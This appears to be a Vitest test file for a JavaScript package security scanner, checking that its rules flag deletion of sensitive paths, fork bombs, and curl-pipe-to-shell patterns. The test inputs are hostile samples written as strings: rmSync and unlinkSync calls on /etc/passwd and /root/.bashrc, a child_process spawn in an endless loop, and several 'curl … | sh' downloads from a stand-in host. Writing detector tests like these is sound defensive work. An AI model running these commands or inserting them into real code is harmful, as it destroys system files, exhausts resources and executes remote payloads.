import { describe, expect, it } from 'vitest'
import { scan } from '../lib/scanner-bin/engine.js'
import { mkdirSync, mkdtempSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Finding, ScanRequest } from '../lib/scanner-bin/protocol.js'

const codeReq = (code: string, overrides: Partial<ScanRequest> = {}): ScanRequest => ({ kind: 'code', language: 'js', runtime: 'host', code, ...overrides })

const of = (report: { findings: Finding[] }, rule: string) => report.findings.filter(f => f.rule === rule)

const withTmp = (files: Record<string, string>, fn: (dir: string) => void): void => {
  const dir = mkdtempSync(join(tmpdir(), 'vet-r16-'))
  for (const [name, content] of Object.entries(files)) {
    const target = join(dir, name)
    mkdirSync(target.slice(0, target.lastIndexOf('/')), { recursive: true })
    writeFileSync(target, content)
  }
  try {
    fn(dir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

describe('round-16 R11 直调/绑定形态与语料门控', () => {
  it('require("fs").rmSync("/etc/passwd") 直调 → R11 high', () => {
    const res = scan(codeReq(`require('fs').rmSync('/etc/passwd', { recursive: true })`))
    const r11 = of(res.report!, 'R11').find(f => f.severity === 'high')
    expect(r11).toBeDefined()
    expect(r11!.message).toContain('删除敏感路径')
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('require("node:fs").unlinkSync(...) → R11 high（node: 前缀）', () => {
    const res = scan(codeReq(`require('node:fs').unlinkSync('/root/.bashrc')`))
    expect(of(res.report!, 'R11').some(f => f.severity === 'high')).toBe(true)
  })

  it('解构绑定：const { unlinkSync } = require("fs"); unlinkSync("/etc/passwd") → R11 high', () => {
    const res = scan(codeReq(`const { unlinkSync } = require('fs'); unlinkSync('/etc/passwd')`))
    const r11 = of(res.report!, 'R11').find(f => f.severity === 'high')
    expect(r11).toBeDefined()
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('形参遮蔽：模块级 const url="/etc/passwd" + 函数形参 url → 不得解析成敏感路径（只 medium）', () => {
    const res = scan(codeReq(`const url = '/etc/passwd'; function f(url) { fs.unlinkSync(url) } f('/tmp/x')`))
    expect(of(res.report!, 'R11').some(f => f.severity === 'high')).toBe(false)
    expect(res.report!.verdict).toBe('clean')
  })

  it('模块级常量解析不回归：const p = "/etc/passwd"; fs.unlinkSync(p) → 仍 high', () => {
    const res = scan(codeReq(`const p = '/etc/passwd'; fs.unlinkSync(p)`))
    expect(of(res.report!, 'R11').some(f => f.severity === 'high')).toBe(true)
  })
})

describe('round-16 R9 fork-bomb 绑定门控', () => {
  it('本地同名函数 spawn + 死循环 → 无 fork-bomb 归因（只留死循环本体高）', () => {
    const res = scan(codeReq(`function spawn(n) { return n } while (true) { spawn(1) }`))
    const bomb = of(res.report!, 'R9').find(f => f.message.includes('fork 炸弹'))
    expect(bomb).toBeUndefined()
  })

  it('真实 child_process 绑定 spawn + 死循环 → fork-bomb 归因保留', () => {
    const res = scan(codeReq(`const { spawn } = require('child_process'); while (true) { spawn('x') }`))
    const bomb = of(res.report!, 'R9').find(f => f.message.includes('fork 炸弹'))
    expect(bomb).toBeDefined()
  })

  it('new Worker 无 worker_threads 绑定 → 不计 fork-bomb', () => {
    const res = scan(codeReq(`function Worker() { return 1 } while (true) { new Worker() }`))
    expect(of(res.report!, 'R9').some(f => f.message.includes('fork 炸弹'))).toBe(false)
  })

  it('new Worker 有 worker_threads 绑定 → fork-bomb 归因保留', () => {
    const res = scan(codeReq(`const { Worker } = require('worker_threads'); while (true) { new Worker(__filename) }`))
    expect(of(res.report!, 'R9').some(f => f.message.includes('fork 炸弹'))).toBe(true)
  })
})

describe('round-16 扫描面：扩展名大小写与无扩展名入口（files 模式）', () => {
  it('大写扩展名 Setup.SH 内的 CURL|SH → R14 high', () => {
    withTmp({
      'pkg/Setup.SH': `CURL -s http://x/p.bin | SH`,
      'pkg/package.json': JSON.stringify({ name: 'x', version: '1.0.0' }),
    }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'pkg/Setup.SH'), join(dir, 'pkg/package.json')] })
      const r14 = of(res.report!, 'R14').find(f => f.severity === 'high')
      expect(r14).toBeDefined()
      expect(r14!.message).toContain('curl|sh')
    })
  })

  it('无扩展名 + node shebang（bin/cli 惯用形态）→ 按 JS 扫 → R20 high', () => {
    withTmp({
      'pkg/cli': `#!/usr/bin/env node\nrequire('child_process').exec('curl -s http://x/p.bin | sh')`,
      'pkg/package.json': JSON.stringify({ name: 'x', version: '1.0.0' }),
    }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'pkg/cli'), join(dir, 'pkg/package.json')] })
      expect(of(res.report!, 'R20').some(f => f.severity === 'high')).toBe(true)
    })
  })

  it('无扩展名 + package.json bin 引用 → 按 JS 扫 → R20 high', () => {
    withTmp({
      'pkg/binref': `const { exec } = require('child_process'); exec('curl -s http://x/p.bin | sh')`,
      'pkg/package.json': JSON.stringify({ name: 'x', version: '1.0.0', bin: { x: './binref' } }),
    }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'pkg/binref'), join(dir, 'pkg/package.json')] })
      expect(of(res.report!, 'R20').some(f => f.severity === 'high')).toBe(true)
    })
  })

  it('无扩展名 + 无 shebang + 未引用 → 跳过（不误解析二进制/无特征文件）', () => {
    withTmp({
      'pkg/random': `just some text without evidence`,
      'pkg/package.json': JSON.stringify({ name: 'x', version: '1.0.0' }),
    }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'pkg/random'), join(dir, 'pkg/package.json')] })
      expect(res.report!.findings.filter(f => f.rule !== 'R6')).toHaveLength(0)
      expect(res.report!.verdict).toBe('clean')
    })
  })

  it('大写扩展名 .TS/.JS 源码 → 同样进入 AST 面（extOf 统一小写）', () => {
    withTmp({
      'pkg/main.TS': `const cp = require('child_process'); cp.exec('curl -s http://x/p.bin | sh')`,
      'pkg/package.json': JSON.stringify({ name: 'x', version: '1.0.0' }),
    }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'pkg/main.TS'), join(dir, 'pkg/package.json')] })
      expect(of(res.report!, 'R20').some(f => f.severity === 'high')).toBe(true)
    })
  })
})